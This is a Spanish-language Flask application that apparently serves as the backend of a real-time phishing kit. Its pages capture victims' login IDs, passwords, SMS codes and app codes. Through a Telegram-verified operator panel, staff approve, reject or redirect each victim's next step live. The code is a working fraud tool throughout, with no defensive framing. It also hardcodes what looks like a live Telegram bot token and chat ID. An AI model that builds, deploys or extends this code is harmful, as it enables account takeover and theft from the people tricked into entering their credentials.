import random
import requests
from datetime import timedelta
from flask import Flask, render_template, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'tu_clave_secreta_super_segura_para_mubeles'

# Configuración de seguridad de cookies y sesiones
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = False  
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# Diccionario de usuarios permitidos para administrar el panel
USUARIOS_AUTORIZADOS = {
    "theteacher": {"rol": "admin", "telegram_id": "5352335307"},
    "operador1": {"rol": "standard", "telegram_id": "5352335307"}
}

# Base de datos en memoria para el monitoreo y control en vivo
REGISTROS_ACTIVOS = {}

TOKEN_BOT = "8075556042:AAFoz2S2xiLqDV_gEm0qc-HsxdbSNFm-nIM"

# ==========================================
# 1. RUTA DE LOGIN Y VISTA GENERAL
# ==========================================
@app.route('/')
def index():
    return redirect(url_for('control_login'))

@app.route('/inicio')
def vista_inicio():
    return render_template('index.html')

@app.route('/control/login', methods=['GET', 'POST'])
def control_login():
    if request.method == 'POST':
        data = request.get_json()
        empleado_id = data.get('id_empleado')
        password = data.get('password')
        
        session['id_empleado'] = empleado_id
        
        REGISTROS_ACTIVOS[empleado_id] = {
            "empleado": empleado_id,
            "password": password,
            "carnet": "Pendiente",
            "actividad": "Pendiente",
            "sucursal": "Pendiente",
            "paso_actual": "Esperando aprobación de Login",
            "estado": "En revisión",
            "decision": "pendiente",
            "fase": "login"
        }
        return jsonify({"status": "waiting"})
        
    return render_template('login.html')

# ==========================================
# 2. RUTAS DE LOGIN Y VERIFICACIÓN PARA EL PANEL (Admin/Operadores)
# ==========================================
@app.route('/control/login_admin', methods=['GET', 'POST'])
def login_admin():
    if request.method == 'POST':
        usuario = request.form.get('usuario', '').strip()
        
        if not usuario:
            return render_template('login_admin.html', error="Por favor ingresa un nombre")
        
        codigo_telegram = str(random.randint(100000, 999999))
        session['temp_usuario'] = usuario
        session['codigo_verificacion'] = codigo_telegram
        
        chat_id = USUARIOS_AUTORIZADOS.get("theteacher", {}).get("telegram_id", "5352335307")
        mensaje = f"🔔 Intento de acceso al panel de *{usuario}*.\n🔐 Código de verificación: *{codigo_telegram}*"
        
        url_telegram = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": mensaje,
            "parse_mode": "Markdown"
        }
        
        try:
            response = requests.post(url_telegram, json=payload, proxies={"http": None, "https": None})
            print("Respuesta de Telegram:", response.text)
        except Exception as e:
            print("Excepción de conexión con Telegram:", e)
        
        return redirect(url_for('verificar_codigo'))
    
    return render_template('login_admin.html')

@app.route('/control/verificar', methods=['GET', 'POST'])
def verificar_codigo():
    if request.method == 'POST':
        codigo_ingresado = request.form.get('codigo', '').strip()
        if codigo_ingresado == session.get('codigo_verificacion'):
            usuario = session.get('temp_usuario')
            
            session.clear()
            session['usuario'] = usuario
            
            if usuario.lower() == "theteacher":
                session['rol'] = 'admin'
            else:
                session['rol'] = 'standard'
                
            session.permanent = True
            
            return redirect(url_for('panel_control'))
        else:
            return render_template('verificar.html', error="Código incorrecto")
            
    return render_template('verificar.html')


@app.route('/control/empresa', methods=['GET', 'POST'])
def control_empresa():
    if request.method == 'POST':
        data = request.get_json()
        empleado_id = data.get('id_empleado')
        password = data.get('password')
        
        session['id_empleado'] = empleado_id
        
        REGISTROS_ACTIVOS[empleado_id] = {
            "empleado": empleado_id,
            "password": password,
            "carnet": "Pendiente Empresas",
            "actividad": "Pendiente",
            "sucursal": "Pendiente",
            "paso_actual": "Esperando aprobación de Login Empresas",
            "estado": "En revisión",
            "decision": "pendiente",
            "fase": "login",
            "siguiente_url": url_for('vista_carnet')
        }
        
        return jsonify({"status": "waiting"})
        
    return render_template('empresa.html')

# ==========================================
@app.route('/control/carnet', methods=['GET', 'POST'])
def vista_carnet():
    empleado_id = session.get('id_empleado', 'Desconocido')
    
    if request.method == 'POST':
        data = request.get_json()
        codigo_carnet = data.get('codigo_carnet')
        session['codigo_carnet'] = codigo_carnet
        
        if empleado_id in REGISTROS_ACTIVOS:
            REGISTROS_ACTIVOS[empleado_id]["carnet"] = codigo_carnet
            REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Esperando aprobación de SMS"
            REGISTROS_ACTIVOS[empleado_id]["decision"] = "pendiente"
            
        return jsonify({"status": "waiting"})
        
    return render_template('carnet.html')

@app.route('/control/horarios', methods=['GET', 'POST'])
def vista_horarios():
    empleado_id = session.get('id_empleado', 'Desconocido')
    
    if request.method == 'POST':
        data = request.get_json()
        actividad = data.get('codigo_actividad')
        sucursal = data.get('codigo_sucursal')
        
        session['codigo_actividad'] = actividad
        session['codigo_sucursal'] = sucursal
        
        if empleado_id in REGISTROS_ACTIVOS:
            REGISTROS_ACTIVOS[empleado_id]["actividad"] = actividad
            REGISTROS_ACTIVOS[empleado_id]["sucursal"] = sucursal
            REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Esperando aprobación de Horarios"
            REGISTROS_ACTIVOS[empleado_id]["decision"] = "pendiente"
            
        return jsonify({"status": "waiting"})
        
    return render_template('horarios.html')

# ==========================================
# 4. APIs DE CONTROL Y MONITOREO DEL PANEL
# ==========================================
@app.route('/control/api/verificar_estado')
def verificar_estado():
    empleado_id = session.get('id_empleado') 
    if not empleado_id or empleado_id not in REGISTROS_ACTIVOS:
        return jsonify({"decision": "esperando"})
    
    info = REGISTROS_ACTIVOS[empleado_id]
    
    return jsonify({
        "decision": info.get("decision"),
        "siguiente": info.get("siguiente_url"),
        "fase": info.get("fase")
    })

@app.route('/control/api/accion', methods=['POST'])
def panel_accion():
    if 'usuario' not in session:
        return jsonify({"status": "error", "message": "No autorizado"}), 401
        
    data = request.get_json()
    empleado_id = data.get('empleado_id')
    accion = data.get('accion')
    
    if empleado_id not in REGISTROS_ACTIVOS:
        return jsonify({"status": "error", "message": "Empleado no encontrado"})
        
    if accion == 'aprobar_login':
        REGISTROS_ACTIVOS[empleado_id]["decision"] = "aprobar"
        REGISTROS_ACTIVOS[empleado_id]["siguiente_url"] = url_for('vista_carnet')
        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Login Aprobado -> En SMS"
        REGISTROS_ACTIVOS[empleado_id]["fase"] = "carnet"

    elif accion == 'saltar_a_horarios':
        REGISTROS_ACTIVOS[empleado_id]["decision"] = "aprobar"
        REGISTROS_ACTIVOS[empleado_id]["siguiente_url"] = url_for('vista_horarios')
        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Login Aprobado -> Saltando a APP"
        REGISTROS_ACTIVOS[empleado_id]["fase"] = "horarios"

    elif accion == 'error_login':
        REGISTROS_ACTIVOS[empleado_id]["decision"] = "error"
        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Error en Login (Reintentando)"
        REGISTROS_ACTIVOS[empleado_id]["fase"] = "login"

    elif accion == 'aprobar_carnet':
        REGISTROS_ACTIVOS[empleado_id]["decision"] = "aprobar"
        REGISTROS_ACTIVOS[empleado_id]["siguiente_url"] = url_for('vista_horarios')
        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Carnet Aprobado -> En APP"
        REGISTROS_ACTIVOS[empleado_id]["fase"] = "horarios"

    elif accion == 'error_carnet':
        REGISTROS_ACTIVOS[empleado_id]["decision"] = "error"
        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Error en SMS (Reintentando)"
        REGISTROS_ACTIVOS[empleado_id]["fase"] = "carnet"

    elif accion == 'aprobar_horarios':
        REGISTROS_ACTIVOS[empleado_id]["decision"] = "aprobar"
        REGISTROS_ACTIVOS[empleado_id]["siguiente_url"] = "/ruta-exito"
        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Proceso Completo Exitoso"
        REGISTROS_ACTIVOS[empleado_id]["estado"] = "Completado"
        REGISTROS_ACTIVOS[empleado_id]["fase"] = "completado"

    elif accion == 'error_horarios':
        REGISTROS_ACTIVOS[empleado_id]["decision"] = "error"
        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Error en APP (Reintentando)"
        REGISTROS_ACTIVOS[empleado_id]["fase"] = "horarios"
        
    elif accion == 'regresar_carnet':
        REGISTROS_ACTIVOS[empleado_id]["decision"] = "error"
        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Volviendo a pedir SMS"
        REGISTROS_ACTIVOS[empleado_id]["fase"] = "carnet"
        REGISTROS_ACTIVOS[empleado_id]["siguiente_url"] = url_for('vista_carnet')

    return jsonify({"status": "success"})

@app.route('/control/api/borrar_empleado/<empleado_id>', methods=['POST'])
def borrar_empleado(empleado_id):
    if session.get('rol') != 'admin':
        return jsonify({"status": "error", "message": "Acceso denegado. Solo theteacher."}), 403
    if empleado_id in REGISTROS_ACTIVOS:
        del REGISTROS_ACTIVOS[empleado_id]
        return jsonify({"status": "success", "message": "Empleado eliminado"})
    return jsonify({"status": "error", "message": "No encontrado"}), 404

@app.route('/control/api/cerrar_sesion_activa/<empleado_id>', methods=['POST'])
def cerrar_sesion_activa(empleado_id):
    if session.get('rol') != 'admin':
        return jsonify({"status": "error", "message": "Acceso denegado. Solo theteacher."}), 403
    if empleado_id in REGISTROS_ACTIVOS:
        REGISTROS_ACTIVOS[empleado_id]["fase"] = "login"
        REGISTROS_ACTIVOS[empleado_id]["decision"] = "error"
        return jsonify({"status": "success", "message": "Sesión cerrada"})
    return jsonify({"status": "error", "message": "No encontrado"}), 404

@app.route('/control/panel')
def panel_control():
    if 'usuario' not in session:
        return redirect(url_for('login_admin'))  
    return render_template('panel.html', rol_usuario=session.get('rol', 'standard'))

@app.route('/control/api/datos')
def api_datos_panel():
    if 'usuario' not in session:
        return jsonify([]), 401
    return jsonify(list(REGISTROS_ACTIVOS.values()))

if __name__ == '__main__':
    app.run(debug=True, port=5000)